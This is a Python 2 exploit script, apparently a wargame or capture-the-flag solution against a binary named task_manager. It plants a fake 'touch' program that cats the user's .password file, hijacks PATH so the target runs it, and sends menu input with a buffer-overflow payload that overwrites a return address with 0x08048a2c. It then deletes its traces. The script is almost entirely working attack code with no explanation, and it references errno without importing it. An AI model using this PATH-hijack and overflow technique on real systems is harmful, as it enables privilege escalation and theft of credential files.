import subprocess, os
filename = "/tmp/test_exploit_mst/touch"

# create test_exploit_mst directory
if not os.path.exists(os.path.dirname(filename)):
    try:
        os.makedirs(os.path.dirname(filename))
    except OSError as exc: # Guard against race condition
        if exc.errno != errno.EEXIST:
            raise

with open(filename, "w") as f:
    f.write("/bin/cat %s/.password" % os.environ['HOME'])

os.system("chmod +x %s" % filename)
try:
	vuln = subprocess.Popen(['/home/task_manager/task_manager'], env={"PATH":"/tmp/test_exploit_mst/"}, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	# raw_input()
	commands = """fakepassword
c
user
Delete Me
Osef will be overwrited
d
3
c
admin
Im accessible from user
%s
m
3
append
%s
done
r
3
q""" % ('A'*27, 'A'*100 + 'A' * 4+ '08048a2c'.decode("hex")[::-1])
	print vuln.communicate(commands + "\n")[0]
except Exception, e:
	print "Exception : ",e

os.system("rm -rf /tmp/test_exploit_mst")
